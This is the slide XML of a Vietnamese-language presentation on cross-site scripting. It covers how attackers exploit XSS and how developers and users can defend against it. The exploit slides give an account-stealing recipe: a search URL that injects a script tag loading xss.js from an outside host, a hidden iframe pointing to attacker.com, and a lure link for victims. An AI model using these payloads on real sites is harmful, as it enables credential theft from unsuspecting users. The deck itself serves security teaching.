            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lấy account</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tạo một file info.txt  và  xss.js rồi upload lên host</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chúng ta để một link có lời giới thiệu hay thông báo gây chú ý </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>http:// hostxss.com /search.php?s="&gt; &lt;script</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>src%3Dhttp%3A%2F%2Fjsngoc.vnn.ms%2Fxss.js&gt;&lt;%2Fscript&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1438726301"/>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9B8372C2-198D-410A-ABAC-52F98C2A7284}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3432175" y="188913"/>
            <a:ext cx="4294188" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác lỗi XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F7C754C-9A20-40C0-B2A0-24C071EA2EBE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1464469" y="2060640"/>
            <a:ext cx="8229600" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ướng trình duyệt của người dùng đến trang web mà Attacker thiết kế sẵn!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sau khi attacker đã có thông tin về lỗi XSS, họ có thể dùng IFRAME, code như sau:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="349250" indent="-349250" algn="just">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>     &lt;iframe src='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2" tooltip="Link added by VigLink"/>
              </a:rPr>
              <a:t>http://www.attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>' width='1' height='1' style='visibility;          hidden;'&gt;&lt;/iframe&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sau khi nạn nhân vào trang giả mạo kẻ đăng nhập tài khoản ,kẻ tấn công sẽ lấy được tài khoản của nạn nhân</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26628" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9A07889-C4B8-42EA-B15B-096444490856}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2309813" y="2871402"/>
            <a:ext cx="0" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0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0631" tIns="0" rIns="-20631" bIns="0"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endParaRPr lang="en-US" altLang="en-US" sz="1800">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1147357961"/>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id="{415A1545-0398-4D17-A423-9C33D874994E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3503614" y="260351"/>
            <a:ext cx="4295775" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Phòng chống XSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" i="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">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936B6C1-6583-4F59-94EE-CCAF9C61D561}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đối với người thiết kế và phát triển ứng dụng web</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chỉ chấp nhận những dữ liệu hợp lệ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Từ chối nhận các dữ liệu hỏng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Liên tục kiểm tra và lọc dữ liệu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tạo ra danh sách những thẻ HTML được phép sử dụng, xóa bỏ các thẻ &lt;script&gt;, coi đoạn script đó như là đoạn trích dẫn lỗi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lọc dấu nháy đơn hay nháy kép</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lọc kí tự NULL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Xóa các kí tự “&gt;”, “&lt;” hoặc Output Endcoding các kí tự đó</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vẫn cho phép nhập dữ liệu đặc biệt nhưng chúng sẽ đc mã hóa theo chuẩn riêng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3395183058"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD3AADFD-B641-4ECE-B305-9472148FE025}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="457200"/>
            <a:ext cx="5030787" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Phòng chống XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F7A5DFD-211E-40CF-B1D7-9918C20A7A14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đối với người dùng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dùng tool kiểm tra có lỗi XSS không:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Acunetix Web Vulnerability Scanner. Watchfire AppScan, App Shield</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dùng Firefox: Có thể cài thêm tiện ích(Add-on) YesScript – kiểm soát script từ website</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dùng IE: Có thể vào Options/Setting/.. Chúng ta Disable Script</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khi chúng ta vào một trang web mới thì ta cần phải cân nhắc khi click vào link, kiểm tra các link thật kĩ trước khi click. Và tóm lại, chúng ta sẽ an toàn hơn khi cảnh giác cao hơn.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="349250" indent="-349250">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http://www.lo0.ro/2011/07/08/top-10-web-application-penetration-testing-tools-actually-11/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" u="sng"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3894467707"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD3AADFD-B641-4ECE-B305-9472148FE025}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="457200"/>
            <a:ext cx="5030787" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Phòng chống XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F7A5DFD-211E-40CF-B1D7-9918C20A7A14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Encoding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CSP (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Content Security Policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>To prevent all types of XSS attacks, secure input handling has to be performed in both client-side and server-side code.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D31DCDF2-E035-4421-9BAE-2C57F45512E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514600" y="2209800"/>
            <a:ext cx="7922394" cy="1295400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E87346CE-87A5-4F38-9763-30184305E62F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2459037" y="3754372"/>
            <a:ext cx="7977958" cy="1274828"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2524181217"/>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IV. NGUY CƠ TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
